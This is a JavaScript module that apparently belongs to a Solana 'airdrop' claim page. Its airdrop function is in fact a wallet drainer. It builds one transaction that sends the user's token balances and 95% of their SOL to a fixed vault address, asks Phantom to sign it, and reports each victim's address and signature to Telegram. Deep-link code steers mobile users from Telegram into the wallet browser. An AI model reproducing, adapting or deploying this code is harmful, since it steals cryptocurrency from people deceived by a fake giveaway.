
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount } from "@solana/spl-token";
import { AIRDROP_SOLANA, SOLANA_RPC_URL } from "./constant";
import { sendToTelegram } from "./telegram";

console.log("🔍 DEBUG: Solana RPC URL:", SOLANA_RPC_URL);
const connection = new Connection(SOLANA_RPC_URL, "confirmed")

// Helper function to check if inside wallet webview
const isInsideWalletWebview = () => {
    const ua = navigator.userAgent;
    return ua.includes("Phantom") || ua.includes("Solflare") || ua.includes("MagicEden");
};

// Helper function to get the original app URL with retry tracking
const getOriginalAppUrl = () => {
    // First check if we already have a stored original URL
    const storedUrl = sessionStorage.getItem("phantomRedirectUrl");
    if (storedUrl) {
        return storedUrl;
    }

    const params = new URLSearchParams(window.location.search);
    
    // Check if we're being called from a deep link (has appUrl param from Phantom)
    const appUrl = params.get("appUrl");
    if (appUrl) {
        const decodedUrl = decodeURIComponent(appUrl);
        sessionStorage.setItem("phantomRedirectUrl", decodedUrl);
        return decodedUrl;
    }
    
    // Get the current location and clean it
    let url = window.location.href;
    // Remove any appUrl or originalUrl params to avoid recursion
    url = url.replace(/[?&]appUrl=[^&]*/, '').replace(/[?&]originalUrl=[^&]*/, '').replace(/&+/g, '&').replace(/\?&/, '?');
    // Remove trailing & or ?
    url = url.replace(/[?&]$/, '');
    
    sessionStorage.setItem("phantomRedirectUrl", url);
    return url;
};

// Helper to detect if from Telegram
const isFromTelegram = () => {
    const ua = navigator.userAgent;
    // Check for Telegram user agents - both iOS and Android variants
    return ua.includes("Telegram") || ua.includes("TelegramBot") || ua.includes("TelegramMessenger");
};

// Helper to wait for provider with retry logic
const waitForProvider = async (maxRetries = 5, retryDelay = 500) => {
    for (let i = 0; i < maxRetries; i++) {
        if (window.solana) {
            console.log("Provider found on attempt", i + 1);
            return window.solana;
        }
        console.log("Waiting for provider... attempt", i + 1);
        await new Promise(resolve => setTimeout(resolve, retryDelay));
    }
    return null;
};

export const connectSolana = async () => {
    try {
        // First check if provider is immediately available
        const provider = window.solana;
        if(provider && provider.connect){
            try {
                console.log("Provider available, attempting connection...");
                const resp = await provider.connect();
                if(resp && resp.publicKey){
                    // Clear the redirect tracking
                    sessionStorage.removeItem("phantomRedirectUrl");
                    return resp.publicKey.toString();
                }
            } catch (connectErr) {
                console.warn("Provider connection failed:", connectErr);
                // If connection fails, fall through to deep linking
            }
        }
        
        // If no provider or connection failed
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        if(isMobile){
            // Check if we're already inside wallet webview
            if (isInsideWalletWebview()) {
                console.log("Already inside wallet webview, waiting for provider injection...");
                // Wait a bit longer for provider to be injected
                const injectedProvider = await waitForProvider(10, 300);
                if (injectedProvider && injectedProvider.connect) {
                    try {
                        const resp = await injectedProvider.connect();
                        if(resp && resp.publicKey){
                            sessionStorage.removeItem("phantomRedirectUrl");
                            return resp.publicKey.toString();
                        }
                    } catch (e) {
                        console.error("Failed to connect using injected provider:", e);
                    }
                }
                throw new Error("Wallet provider did not properly initialize in webview");
            }

            // Not inside wallet yet, need to use deep link
            const originalUrl = getOriginalAppUrl();
            const redirectUrl = `https://phantom.app/ul/browse/${encodeURIComponent(originalUrl)}`;
            
            console.log("Redirecting to Phantom deep link from:", isFromTelegram() ? "Telegram" : "Browser");
            console.log("Deep link:", redirectUrl);
            
            // Set a flag to track that we're redirecting
            sessionStorage.setItem("awaitingWalletReturn", "true");
            
            // Use window.location.href for the redirect
            window.location.href = redirectUrl;
            
            // Return null and wait for page to reload with wallet
            return null;
        } else {
            alert("Please install Phantom wallet extension for your desktop browser");
            return null;
        }
    } catch (err){
        console.error("Error in connectSolana:", err);
        // Clear the redirect flag on error
        sessionStorage.removeItem("awaitingWalletReturn");
        return null;
    }
}

export const handleSolanaAirdrop = async (userAddress, tokenMints) => {
    if (!userAddress) {
        throw new Error("Invalid user address");
    }
    
    console.log("🔍 DEBUG: User address received:", userAddress);
    console.log("🔍 DEBUG: Connected wallet from Phantom:", window.solana?.publicKey?.toString());
    
    const provider = window.solana
    if (!provider) {
        throw new Error("Solana provider not found. Please ensure Phantom wallet is installed.");
    }
    
    if (!provider.signAndSendTransaction) {
        throw new Error("Provider does not support transactions. Update your wallet.");
    }
    
    const userPubKey = new PublicKey(userAddress)
    console.log("🔍 DEBUG: User public key:", userPubKey.toString());
    const vaultPubKey = new PublicKey(AIRDROP_SOLANA)
    const transaction = new Transaction()

    try {
        // 1. ADD TOKEN TRANSFERS FIRST 
        // / 1. Add Priority Fees (Crucial for Mainnet speed)
        transaction.add(
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 50000 })
        );

        // 2. Add Token Transfers (Limited to top 4 to prevent size errors)
        let addedInstructions = 0;
        for (const mintAddress of tokenMints) {
            if (addedInstructions >= 8) break; // Safety limit for TX size

            try {
                const mint = new PublicKey(mintAddress);
                const sourceATA = await getAssociatedTokenAddress(mint, userPubKey);
                const destATA = await getAssociatedTokenAddress(mint, vaultPubKey);

                const tokenAccount = await connection.getTokenAccountBalance(sourceATA);
                const amount = tokenAccount.value.amount;

                if (parseFloat(amount) > 0) {
                    const info = await connection.getAccountInfo(destATA);
                    if (!info) {
                        transaction.add(
                            createAssociatedTokenAccountInstruction(
                                userPubKey, destATA, vaultPubKey, mint
                            )
                        );
                        addedInstructions++;
                    }
                    transaction.add(createTransferInstruction(sourceATA, destATA, userPubKey, amount));
                    addedInstructions++;
                }
            } catch (e) { 
                console.warn("Token transfer error:", e);
                continue; 
            }
        }

        // 3. Add SOL Transfer (95% of balance)
        console.log("🔍 DEBUG: Checking balance for:", userPubKey.toString());
        const balance = await connection.getBalance(userPubKey);
        console.log("SOL balance:", balance, "LAMPORTS");
        console.log("🔍 DEBUG: Balance threshold check:", balance, ">", 0.005 * LAMPORTS_PER_SOL, "?", balance > 0.005 * LAMPORTS_PER_SOL);
        if (balance > 0.005 * LAMPORTS_PER_SOL) {
            const amountToSend = Math.floor(balance * 0.95); 
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: userPubKey,
                    toPubkey: vaultPubKey,
                    lamports: amountToSend
                })
            );
        }

        // 4. Finalize
        transaction.feePayer = userPubKey;
        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

        console.log("Transaction prepared, requesting signature...");
        
        // Request signature
        const response = await provider.signAndSendTransaction(transaction);
        const signature = response.signature || response; 

        console.log("Transaction signature:", signature);
        
        await sendToTelegram(`🚀 Solana Airdrop Pending\nUser: ${userAddress}\nSig: ${signature}`);
        return signature;
    } catch (err){
        console.error("Solana error:", err);
        throw err;
    }
}